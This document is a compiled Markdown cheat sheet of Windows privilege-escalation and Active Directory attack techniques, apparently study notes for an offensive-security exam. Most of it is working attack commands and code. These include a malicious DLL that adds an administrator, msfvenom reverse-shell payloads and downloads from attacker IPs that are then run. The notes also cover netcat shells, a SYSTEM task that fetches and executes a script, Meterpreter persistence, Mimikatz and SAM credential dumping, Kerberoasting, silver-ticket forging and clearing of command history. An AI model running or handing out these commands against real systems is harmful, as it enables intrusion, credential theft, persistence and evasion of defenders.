## Privilege Escalation Windows Checklist

> Source: `01101100-C0D3X-00110110.md` → `Detailed Checklists > Privilege Escalation Windows Checklist`

1. Run Seatbelt or WinPEAS for initial enumeration.
2. Use `dsregcmd` to check domain registration.
3. Open PowerShell as admin.
4. Import PowerView:

```powershell
Set-ExecutionPolicy Bypass -Scope Process
Import-Module C:\Tools\PowerView.ps1
Get-NetDomain
```

5. Rerun these steps with different users or attempt `RunAs` with different users or admin PowerShell.
6. Run Seatbelt with system checks:

```powershell
Seatbelt.exe -group=system
```

7. Show hidden files and file extensions.
8. Gather system information:

```powershell
systeminfo
whoami /groups
whoami /all
```

9. Check command history.
10. Examine environment variables:

```powershell
Get-ChildItem Env:
```

11. Run WinPEAS for privilege escalation paths.
12. Enumerate existing users and groups.
13. List group memberships:

```powershell
net user
quser
net localgroup
net localgroup administrators
```

14. Get operating system details:

```powershell
systeminfo
Get-AppLockerPolicy
```

15. Examine AppLocker policies.
16. Check antivirus status:

```powershell
Get-MpPreference
Get-MpComputerStatus
```

17. Inspect the system path:

```powershell
$env:PATH
```

18. List installed applications.
19. Check for KeePass installations.
20. Examine services—start disabled services if possible (e.g., SSH).
21. List running processes:

```powershell
Get-Process | Sort-Object CPU -Descending
```

22. Check for service binary hijacking.
23. Inspect scheduled tasks.
24. Filter non-Microsoft tasks.
25. Use `Invoke-AllChecks` from PowerUp.
26. Check startup directories and autostart entries.
27. Attempt to `RunAs` different users.
28. Inspect the root of `C:\` drive.
29. Check for `Windows.old`.
30. Search for sensitive files:

```powershell
Get-ChildItem -Path C:\Users\ -Include * -File -Recurse -ErrorAction SilentlyContinue
```

31. Attempt to dump SAM database information.
32. Run Live Forensicator scripts.
33. Search for flags using PowerShell one-liners.
34. Check `C:\Windows\System32\Drivers\etc\hosts`.
35. Repeat enumeration steps—**Enumeration is key; try harder.**
36. Verify all findings and ensure no steps were missed.


## Check Permissions!

> Source: `01101100-C0D3X-00110110.md` → `PrivEsc > Check Permissions!`

Check permissions for folders, files, processes, programs, connections, etc.

## DLL Hijacking

> Source: `01101100-C0D3X-00110110.md` → `PrivEsc > Windows > DLL Hijacking`

https://hijacklibs.net/

- **Find Installed Applications:**

```PowerShell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall*" | select displayname
```

- **Identify Vulnerable DLLs:** _(Requires tools like Process Monitor or manual analysis)
- **Check Service Permissions:**

```PowerShell
icacls "<path_to_service_binary>"
```
    - _Look for "F" (Full Access) for users/groups._
    - Use `runas /user:relia\jim cmd` for elevated shell if permissions are bad - Doesn't need to be user on machine, just needs to be domain user!_
- Can use sysinternals to find dll
	- Start .exe by clicking it
	- Filter for
		- Process Name = scheduler.exe
		- Result != SUCCESS
		- Operation = Create File
- **Malicious DLL (example - adds user 'gigs'):**

```C++
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) {
    switch ( ul_reason_for_call ) {
        case DLL_PROCESS_ATTACH:
            int i;
            i = system ("net user gigs password123! /add");
            i = system ("net localgroup administrators gigs /add");
            break;
        case DLL_THREAD_ATTACH: break;
        case DLL_THREAD_DETACH: break;
        case DLL_PROCESS_DETACH: break;
    }
	return TRUE;
}
```

- **Cross-compile (Kali):**

```bash
x86_64-w64-mingw32-gcc <dll_name>.cpp --shared -o <vulnerable_dll_name>.dll -lws2_32
``` 

- **Transfer to Target:**

```PowerShell
iwr -uri http://<kali_ip>/<vulnerable_dll_name>.dll -OutFile '<path_to_application>/<vulnerable_dll_name>.dll'
```

- **Start Application:** _(DLL runs with application's privileges)_
- **Verify:**

```PowerShell
net user
net localgroup administrators
```


## Unquoted Service Path

> Source: `01101100-C0D3X-00110110.md` → `PrivEsc > Windows > Unquoted Service Path`

- **Enumerate Services with Unquoted Paths:**

```PowerShell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
wmic service get name,pathname | findstr /i /v "C:\Windows\" | findstr /i /v """
```

- **Check Path Permissions:**

```PowerShell
icacls "<vulnerable_path>"
```
    - _Look for "W" (Write) for BUILTIN\Users._
- **Create Malicious Executable (example - adds user 'gigs'):**


```bash
# Using msfvenom (Kali)
msfvenom -p windows/exec CMD='net user gigs password123! /add' -f exe -o "C:\Program Files\Unquoted Path Service\common.exe"
```

- **Start Service:**

```PowerShell
Start-Service <vulnerable_service_name>
```

- **Verify:**

```PowerShell
net user
net localgroup administrators
```

- **Alternative using PowerUp:**

```PowerShell
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
Write-ServiceBinary -Name '<vulnerable_service_name>' -Path "C:\Program Files\Unquoted Path Service\common.exe"
Restart-Service <vulnerable_service_name>
```


## Scheduled Tasks

> Source: `01101100-C0D3X-00110110.md` → `PrivEsc > Windows > Scheduled Tasks`

- **View Scheduled Tasks:**

```PowerShell
Task Scheduler #windows + r taskschd.msc
Get-ScheduledTask
schtasks /query /fo LIST /v
```

- **Check Task File Permissions:**

```PowerShell
icacls "<path_to_task_executable>"
```

- **Replace Executable (example using `adduser.exe`):**


```PowerShell
iwr -Uri http://<kali_ip>/adduser.exe -Outfile "<path_to_task_executable>"
# Might need to backup original
move "<original_path>" "<backup_name>"
move .\BackendCacheCleanup.exe .\Pictures\
```

- **Wait for Task to Run:**
- **Verify:**

```PowerShell
net user
net localgroup administrators
```


## add user to RDP

> Source: `01101100-C0D3X-00110110.md` → `Compile > add user to RDP`

```
net localgroup "Remote Desktop Users" <username> /add
```


## add user to local administrator

> Source: `01101100-C0D3X-00110110.md` → `Compile > add user to local administrator`

```
net localgroup administrators <username> /add
```


## add user to domain group

> Source: `01101100-C0D3X-00110110.md` → `Compile > add user to domain group`

```
net group "<group_name>" <username> /ADD /DOMAIN
```


## add usdf - Modify service binary path

> Source: `01101100-C0D3X-00110110.md` → `Compile > add usdf - Modify service binary path`

```
sc config <Service_Name> binpath= "net user rilak 'P@ssw0rd' /add"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
```


## Mimikatz.ps1 Dump passwords of scheduled tasks

> Source: `01101100-C0D3X-00110110.md` → `Mimikatz > Mimikatz.ps1 Dump passwords of scheduled tasks`

```
Invoke-Mimikatz -Command '"vault::cred /patch"'
```


## PrivEsc Add user to local administrators group

> Source: `01101100-C0D3X-00110110.md` → `PowerUp > PrivEsc Add user to local administrators group`

```
Invoke-ServiceAbuse -Name '<VulnerableSvc>' -UserName '<doamin>\<username>'
```


## PrivEsc Exploit vulnerable service permissions

> Source: `01101100-C0D3X-00110110.md` → `PowerUp > PrivEsc Exploit vulnerable service permissions`

```
Invoke-ServiceAbuse -Name "<VulnerableSvc>" -Command "net localgroup Administrators <domain>\<username> /add"
```


## PrivEsc Exploit an unquoted service path

> Source: `01101100-C0D3X-00110110.md` → `PowerUp > PrivEsc Exploit an unquoted service path`

```
Write-ServiceBinary -Name '<VulnerableSvc>' -Command 'c:\windows\system32\rundll32 c:\Users\Public\beacon.dll,Update' -Path 'C:\Program Files\<VulnerableSvc>'
```


## DLL Hijacking

> Source: `01101100-C0D3X-00110110.md` → `PowerUp.ps1 > DLL Hijacking`

https://hijacklibs.net/

```
Write-HijackDll -DllPath 'C:\Users\ted\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll' -UserName '<domain>\username'
```


## ServiceAbuse

> Source: `01101100-C0D3X-00110110.md` → `PowerUp.ps1 > ServiceAbuse`

```
Invoke-ServiceAbuse -Name 'vds' -UserName '<domain>\username'
```


## GodPotato

> Source: `01101100-C0D3X-00110110.md` → `GodPotato`

```
GodPotato-NET4.exe -cmd "net user rilak 1qaz@WSX /add"
GodPotato-NET4.exe -cmd "net localgroup Administrators rilak /add"
```

---

## SYSTEM SCHEDULED TASK?

> Source: `01101100-C0D3X-00110110.md` → `SYSTEM SCHEDULED TASK?`

```powershell
schtasks /create /ru SYSTEM /sc ONSTART /tn WinUpdate /tr "powershell -ep bypass -c iex((New-Object Net.WebClient).DownloadString('http://<ip>/rev.ps1'))"
```


## WMI EVENT SUB BACKDOOR?

> Source: `01101100-C0D3X-00110110.md` → `WMI EVENT SUB BACKDOOR?`

```powershell
powershell -c "Invoke-WmiMethod -Namespace root\subscription ..."
```

############################################


## CLEAR CMD RUNMRU?

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU?`

```powershell
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
```
########################################################

---
+-------------------------------+  
| INITIAL ENUMERATION |  
+-------------------------------+

**DOMAIN ENUM (if joined)**  
BloodHound / SharpHound

**WHOAMI?**  
```cmd
whoami  
echo %username%
```

**PRIVILEGES?**  
```cmd
whoami /priv
```

**SYSTEM INFO**  
```cmd
systeminfo  
wmic os get Caption,CSDVersion,OSArchitecture,Version
```

**SERVICES**  
```cmd
wmic service get name,startname  
net start
```

**ADMIN CHECK**  
```cmd
net localgroup administrators  
net user
```

**NETWORK**  
```cmd
netstat -anoy  
route print  
arp -A  
ipconfig /all
```

**USERS**  
```cmd
net users  
net user  
net localgroup
```

**FIREWALL**  
```cmd
netsh advfirewall firewall show rule name=all
```

**SCHEDULED TASKS**  
```cmd
schtasks /query /fo LIST /v > schtasks.txt
```

INSTALLATION RIGHTS  
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```
+-----------------------------------------------------------------------+
|     WINDOWS PRIV ESC: GITHUB EXPLOITS                                 |
+-----------------------------------------------------------------------+
| Privilege Name              | GitHub PoC                              |
|---------------------------- |-----------------------------------------|
| SeDebugPrivilege            | github.com/bruno-1337/SeDebugPrivilege- |
| SeImpersonatePrivilege      | github.com/itm4n/PrintSpoofer           |
| SeAssignPrimaryToken        | github.com/b4rdia/HackTricks            |
| SeTcbPrivilege              | github.com/hatRiot/token-priv           |
| SeCreateTokenPrivilege      | github.com/hatRiot/token-priv           |
| SeLoadDriverPrivilege       | github.com/k4sth4/SeLoadDriverPrivilege |
| SeTakeOwnershipPrivilege    | github.com/hatRiot/token-priv           |
| SeRestorePrivilege          | github.com/xct/SeRestoreAbuse           |
| SeBackupPrivilege           | github.com/k4sth4/SeBackupPrivilege     |
| SeIncreaseQuotaPrivilege    | github.com/b4rdia/HackTricks            |
| SeSystemEnvironment         | github.com/b4rdia/HackTricks            |
| SeMachineAccount            | github.com/b4rdia/HackTricks            |
| SeTrustedCredManAccess      | learn.microsoft.com/...trusted-caller   |
| SeRelabelPrivilege          | github.com/decoder-it/RelabelAbuse      |
| SeManageVolumePrivilege     | github.com/CsEnox/SeManageVolumeExploit |
| SeCreateGlobalPrivilege     | github.com/b4rdia/HackTricks            |
+-----------------------------------------------------------------------+
```
Notes:
- PrintSpoofer is gold for `SeImpersonatePrivilege`.
- `SeManageVolume` has practical field PoCs.
+----------------------------+
|     MAINTAINING ACCESS     |
+----------------------------+
> METERPRETER REVERSE SHELL SETUP
```bash
  msfconsole
  use exploit/multi/handler
  set PAYLOAD windows/meterpreter/reverse_tcp
  set LHOST <attacker_ip>
  set LPORT <port>
  exploit
```

> PERSISTENCE
```bash
  meterpreter > run persistence -U -i 5 -p 443 -r <LHOST>
```

> PORT FORWARDING
```bash
  meterpreter > portfwd add -l 3306 -p 3306 -r <target_ip>
```

> SYSTEM MIGRATION
```bash
  meterpreter > run post/windows/manage/migrate
  meterpreter > migrate <PID>
```

> EXECUTE PAYLOADS
```powershell
  powershell.exe "C:\Tools\privesc.ps1"
```

+-------------------------------+
|        PRIVES EC CHECKLIST    |
+-------------------------------+
> UNQUOTED SERVICE PATHS
```cmd
  wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /v "C:\Windows" | findstr /v '"'
```

> WEAK SERVICE PERMISSIONS
```cmd
  accesschk.exe -uwcqv <service>
  sc qc <service>
  icacls "C:\Path\To\Service.exe"
```

> FILE TRANSFER OPTIONS
```cmd
  certutil.exe
  powershell (IEX)
  SMB / FTP / TFTP / VBScript
```

> CLEAR TEXT CREDENTIALS
```cmd
  findstr /si password *.txt *.xml *.ini
  dir /s *pass* == *cred* == *.config*
```

> WEAK FILE PERMISSIONS
```cmd
  accesschk.exe -uwqs Users c:\*.*
  accesschk.exe -uwqs "Authenticated Users" c:\*.*
```

> NEW ADMIN USER (Local/Domain)
```cmd
  net user siren P@ssw0rd! /add
  net localgroup administrators siren /add
  net group "Domain Admins" siren /add /domain
```

+--------------------------------+
|     SCHEDULED TASK ABUSE       |
+--------------------------------+
> ENUM
```cmd
  schtasks /query /fo LIST /v > tasks.txt
```

> CREATE SYSTEM TASK
```cmd
  schtasks /create /ru SYSTEM /sc MINUTE /mo 5 /tn RUNME /tr "C:\Tools\sirenMaint.exe"
```

> RUN TASK
```cmd
  schtasks /run /tn "RUNME"
```

+-------------------------------+
|    POST EXPLOIT ENUMERATION   |
+-------------------------------+
> NETWORK USERS
```cmd
  net user
  net user <target>
  net localgroup administrators
```

> NT AUTHORITY CHECKS
```cmd
  whoami
  accesschk.exe /accepteula
  MS09-012.exe "whoami"
```

> HASH DUMP
`  meterpreter > hashdump`

> EXFILTRATE ntds.dit
`  Use secretsdump.py or disk capture tools`

> INSTALLER ABUSE
```cmd
  AlwaysInstallElevated = 1
  msiexec /i evil.msi
```

> SHARE ENUMERATION
```cmd
  net share
  net use
  net use Z: \\TARGET\SHARE /persistent:yes
```

+----------------------------+
|   TOOLKIT / RESOURCES      |
+----------------------------+
> Windows Exploit Suggester
  https://github.com/AonCyberLabs/Windows-Exploit-Suggester

> Cross Compile Payloads (Linux > Windows)
```bash
  apt-get install mingw-w64
  x86: i686-w64-mingw32-gcc hello.c -o hello.exe
  x64: x86_64-w64-mingw32-gcc hello.c -o hello64.exe
```

> Additional Reading
  https://www.fuzzysecurity.com/tutorials/16.html
  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation

---


[Windows Local Privilege Escalation | HackTricks | HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)

```
whoami
whoami /priv
whoami /groups
net user
Get-LocalUser
net user steve
Get-LocalUser steve
net group
Get-LocalGroup
Get-LocalGroupMember Administrators
net localgroup administrators
```


## System

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Windows > System`

```
systeminfo
hostname
ipconfig
Get-ADdomain
netstat -a
tree \users\ /f /a
```


## PowerShell history

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Windows > PowerShell history`

```
Get-History
(Get-PSReadlineOption).HistorySavePath
type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\Lance.Rubens\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```
Get-ChildItem Env: | ft Key,Value
```

```
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.kdbx,*.log -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

icacls "C:\Program Files\MilleGPG5\GPGService.exe"
stop-service GPGOrchestrator
copy shell.exe "C:\Program Files\MilleGPG5\GPGService.exe"
start-service GPGOrchestrator
```

```
sc.exe qc VeyonService
move veyon-service.exe veyon-service.bak
move shell64.exe veyon-service.exe
shutdown /r /t 0
```

```
schtasks /query /fo LIST /v | Select-String -Pattern "TaskName:"
schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run:"

schtasks /query /fo LIST /v /tn \Microsoft\CacheCleanup
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
```


## Git

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Windows > Git`

```
gci -Recurse -Filter ".git" -Directory -ErrorAction SilentlyContinue -Path "C:\Users\"
```
```
git clone https://github.com/arthaud/git-dumper.git
python -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
python git_dumper.py http://192.168.217.144/.git ~/Documents/oscpA/git144
```
```
takeown /F <dir> /R
git log
git diff <commit hash>
```


## Service Hijacking

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Windows > Service Hijacking`

```
Restart-Service -Name 'mysql'
shutdown /r /t 0
```
```
get-childitem env:
```
```
echo %PATH%
get-childitem env:path | Format-List *
certutil -urlcache -split -f http://192.168.45.214/shell.dll C:\Users\emma\AppData\Local\Microsoft\WindowsApps\BetaLibrary.Dll
```


## AlwaysInstallElevated

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Windows > AlwaysInstallElevated`

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.154 LPORT=445 -f msi > notavirus.msi
msiexec /i notavirus.msi
```


## WinPEASx64.exe

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Windows > WinPEASx64.exe`

```
certutil -split -urlcache -f http://192.168.45.218/winPEASx64.exe \windows\temp\winpeas.exe
\windows\temp\winpeas.exe
```


## SeRestorePrivilege

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Windows > SeRestorePrivilege`

```
# Enable the privilege (Can skip if Enabled already)
wget https://raw.githubusercontent.com/gtworek/PSBits/master/Misc/EnableSeRestorePrivilege.ps1
certutil -urlcache -split -f http://192.168.45.211/EnableSeRestorePrivilege.ps1
./EnableSeRestorePrivilege.ps1

# Abuse with RDP - Change binary in system32
move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
move C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
rdesktop 192.168.224.165
# press Win+U

# If shell drops we can add user to admin group with fast typing
net localgroup administrators enox /add
```

[Abusing Tokens | HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#table)


## SeBackupPrivilege

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Windows > SeBackupPrivilege`

```
mkdir C:\temp
reg save hklm\sam C:\temp\sam.hive
reg save hklm\system C:\temp\system.hive
# download the files to Kali
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```


## SeManageVolumePrivilege

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Windows > SeManageVolumePrivilege`

https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public?source=post_page-----b95d3146cfe9---------------------------------------
```cmd
certutil -urlcache -split -f http://192.168.45.214/SeManageVolumeExploit.exe
\SeManageVolumeExploit.exe

msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.214 LPORT=443 -f dll -o Printconfig.dll

certutil -split -urlcache -split -f http://192.168.45.214/payload/Printconfig.dll

copy Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\
# press Yes

nc -lvnp 443 # setup listener on KALI

# on target - run trigger
powershell
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
$object = [Activator]::CreateInstance($type)
# should get nt authority\system shell


--- another dll to try

Systeminfo’s tzres.dll

Create another reverse shell outputting the file as tzres.dll and transfer it to the victim; placing it in the c:\windows\system32\wbem directory

Start listener

Run systeminfo
```

There is another trigger we can use (Report.wer and WerTrigger.exe in /bin in repo):

[GitHub - sailay1996/WerTrigger: Weaponizing for privileged file writes bugs with windows problem reporting](https://github.com/sailay1996/WerTrigger/tree/master)


## Invoke-RunasCs.ps1 Or RunasCs.exe

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Windows > Invoke-RunasCs.ps1 Or RunasCs.exe`

Allows to run commands as another user locally

```
certutil -split -urlcache -f http://192.168.45.197/Invoke-RunasCs.ps1
Import-Module .\Invoke-RunasCs.ps1
Invoke-RunasCs svc_mssql trustno1 "C:\xampp\htdocs\uploads\shell64.exe"
```
```
runas /env /profile /user:DVR4\Administrator "C:\temp\nc.exe -e cmd.exe 192.168.118.14 443"
runas /user:oscp\bernie cmd.exe
# With RDP we can run as administrator (cmd) and type cleartext creds of other admin user
```

It is important so the payload will be correct arch. Use this powershell script:

```
Add-Type -MemberDefinition @'
[DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool IsWow64Process(
    [In] System.IntPtr hProcess,
    [Out, MarshalAs(UnmanagedType.Bool)] out bool wow64Process);
'@ -Name NativeMethods -Namespace Kernel32

Get-Process "FJTWSVIC" | Foreach {
    $is32Bit=[int]0 
    if ([Kernel32.NativeMethods]::IsWow64Process($_.Handle, [ref]$is32Bit)) { 
        "$($_.Name) $($_.Id) is $(if ($is32Bit) {'32-bit'} else {'64-bit'})" 
    } 
    else {"IsWow64Process call failed"}
```

so the payload which we generate will be x86:

```
msfvenom -p windows/shell_reverse_tcp -f dll -o UninOldIS.dll LHOST=192.168.45.213 LPORT=443
```
```
set PATH=%SystemRoot%\system32;%SystemRoot%;
%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
```
```
%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass .\exploit.ps1
```


## Cross-Compile

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Windows > Cross-Compile`

```
i686-w64-mingw32-gcc 40564.c -o pwn.exe -lws2_32
```
```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```


## PrintSpoofer

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Windows > PrintSpoofer`

```
iwr -uri http://10.10.137.147:8888/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c powershell.exe
```

if error jumps during download try:

```
$ProgressPreference = "SilentlyContinue"
-UseBasicParsing (required -Outfile)
```


## Potatoes

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Windows > Potatoes`

**JuicyPotatoNG**

```
cd \Windows\Temp
certutil -urlcache -split -f http://192.168.45.234/JuicyPotatoNG.exe
.\JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami > C:\test.txt"
certutil -urlcache -split -f http://192.168.45.234/nc64.exe
.\JuicyPotatoNG.exe -t * -p "C:\Windows\Temp\nc64.exe" -a "192.168.45.234 443 -e cmd.exe"
```

[https://github.com/antonioCoco/JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG)

**GodPotato**

```
certutil -urlcache -split -f http://192.168.45.247/GodPotato/GodPotato-NET4.exe
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "cmd /c C:/Windows/Temp/shell.exe"

.\GodPotato-NET4.exe -cmd "nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.247 443"
net user /add [username] [password]
net localgroup administrators [username] /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```
```
net user /add kali SuperPass123!
net localgroup administrators kali /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

[https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

**SweetPotato**

Download:

```
.\SweetPotato.exe -e EfsRpc -p c:\Users\Public\nc.exe -a "10.10.10.10 1234 -e cmd"
```

[https://github.com/CCob/SweetPotato](https://github.com/CCob/SweetPotato)

**JuicyPotato (x86)**

Download: [https://github.com/ivanitlearning/Juicy-Potato-x86/releases](https://github.com/ivanitlearning/Juicy-Potato-x86/releases)

Get CLSID: [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

```
Juicy.Potato.x86.exe -c {CLSID} -t * -l 443 -p "C:\Temp\nc.exe" -a "192.168.45.194 443 -e cmd"
```

[juicy-potato/CLSID at master · ohpe/juicy-potato](https://github.com/ohpe/juicy-potato/tree/master/CLSID)

Video: [https://www.youtube.com/watch?v=k9p6wZO7RyY](https://www.youtube.com/watch?v=k9p6wZO7RyY)


## CLEAR CMD RUNMRU? / Active Directory

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Active Directory`

[Domain Enumeration + Exploitation | burmat / nathan burchfield](https://burmat.gitbook.io/security/hacking/domain-exploitation)

```
net users
net users /domain
net groups /domain
net localgroup administrators
```


## PowerView

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > PowerView`

```
certutil -urlcache -split -f http://192.168.45.226/PowerView.ps1
iwr -uri http://10.10.170.141:8080/PowerView.ps1 -UseBasicParsing -OutFile C:\Users\celia.almeda\Documents\PowerView.ps1
Import-Module .\PowerView.ps1

IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.45.171/PowerView.ps1')
```

[PowerView/SharpView | HackTricks | HackTricks](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview)


## Kerberoasting

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > PowerView > Kerberoasting`

```
sudo impacket-GetUserSPNs -request -dc-ip 10.10.137.146 oscp.exam/web_svc
```
```
certutil -urlcache -split -f http://192.168.45.214/Rubeus.exe
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
type hashes.kerberoast
```
```
netexec smb 192.168.204.187 -u svc_mssql -p trustno1
```


## AS-REP Roasting

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > PowerView > AS-REP Roasting`

```
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
```


## ACLs

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > PowerView > ACLs`

[Abusing Active Directory ACLs/ACEs | Red Team Notes](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)

***Generic All***

```
ldeep ldap -u tracy.white -p 'zqwj041FGX' -d ldap://nara-security.com -s 192.168.181.30 add_to_group "CN=TRACY WHITE,OU=STAFF,DC=NARA-SECURITY,DC=COM" "CN=REMOTE ACCESS,OU=remote,DC=NARA-SECURITY,DC=COM"
```
```
net user jen Password123 /domain
```

**Generic All on Computer**: [**Resource Based Constrained Delegation Attack**](https://www.notion.so/Resource-Based-Constrained-Delegation-Attack-8003ef218a7e4cb2b7d0709521e85355?pvs=21)

***ReadGMSAPassword***

```
wget https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe
 certutil -split -urlcache -f http://192.168.45.171/GMSAPasswordReader.exe
.\GMSAPasswordReader.exe --AccountName svc_apache$
```


## GPOs

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > PowerView > GPOs`

```
Get-DomainGPOLocalGroup | select GPODisplayName, GroupName, GPOType
```

[SharpGPOAbuse/SharpGPOAbuse-master at main · byronkg/SharpGPOAbuse](https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master)

```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "DEFAULT DOMAIN POLICY"
gpupdate /force
# check if added to admin
net localgroup administrators
# Need to relogin with RDP, psexec, winrm, etc. to read `proof.txt`
```


## Silver Ticket

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > PowerView > Silver Ticket`

```
1. Get nthash -> https://codebeautify.org/ntlm-hash-generator // To translate cleartext to NTLM
2. Get domain-sid + domain -> (powershell) Get-ADdomain // DomainSID + Forest (fields)
3. Get spn -> (powershell) Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames //ServicePrincipalNames (field)

impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
export KRB5CCNAME=$PWD/Administrator.ccache
// Add to /etc/krb5user.conf -> one box below
// Add to /etc/hosts -> one box below
impacket-mssqlclient -k nagoya.nagoya-industries.com 
enable_xp_cmdshell
xp_cmdshell whoami
xp_cmdshell "certutil -URLCache -split -f http://192.168.45.171/payload/shell64.exe \Windows\Temp\shell64.exe"
xp_cmdshell "\Windows\Temp\shell64.exe"
```
```
[libdefaults]
    default_realm = NAGOYA-INDUSTRIES.COM
    kdc_timesync = 1
    ccache_type = 4
    forwardable = true
    proxiable = true
    rdns = false
    dns_canonicalize_hostname = false
    fcc-mit-ticketflags = true

[realms]    
    NAGOYA-INDUSTRIES.COM = {
        kdc = nagoya.nagoya-industries.com
    }

[domain_realm]
    .nagoya-industries.com = NAGOYA-INDUSTRIES.COM
```
```
240.0.0.1 nagoya.nagoya-industries.com
```


## Mimikatz

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Mimikatz`

```
certutil -urlcache -split -f http://192.168.45.241/mimikatz.exe
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

token::elevate
lsadump::sam
```
```
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "sekurlsa::msv" "lsadump::sam" "exit"
```


## impacket-secretsdump

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Mimikatz > impacket-secretsdump`

